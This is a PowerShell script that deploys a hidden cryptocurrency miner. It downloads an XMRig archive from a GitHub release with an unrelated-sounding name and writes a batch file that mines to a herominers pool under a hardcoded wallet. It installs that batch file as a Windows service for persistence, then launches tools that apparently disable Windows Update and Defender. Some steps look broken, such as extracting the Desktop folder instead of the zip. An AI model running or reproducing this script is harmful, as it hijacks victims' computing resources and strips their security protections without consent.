$downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"
$url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/CSANGXMRIG.zip"
Invoke-WebRequest -Uri $url -OutFile "$downloadPath\CSANGXMRIG.zip"

$destinationPath = "C:\CSANGXMRIG" 
Expand-Archive -Path $downloadPath -DestinationPath $destinationPath -Force

Start-Sleep -Seconds 2

Set-Location -Path "C:\AutoRclone-master"
$userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$userName = $userName -replace "^.*\\", ""
$folderPath = "C:\CSANGXMRIG\"
$batContent = @"
cd %~dp0
xmrig.exe --donate-level 1 -o de.qrl.herominers.com:1166 -u Q01050060fadbd7c6007b985f0ab38b888069e663b5f708ebc2322a64571087eff6ad31a62ecd21 -p $userName -a rx/0 -k
pause
"@
$batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force

New-Item -Path "$env:USERPROFILE\Desktop\Service_OK.dat" -ItemType File

Start-Process -FilePath "nssm.exe" -ArgumentList "install CHIVES `"$folderPath\van.bat`""
Start-Sleep -Seconds 1
Start-Process -FilePath "nssm.exe" -ArgumentList "start CHIVES"
Start-Process -FilePath "wub.exe" -ArgumentList "/D"
Start-Process -FilePath "dfControl.exe"
Start-Sleep -Seconds 1
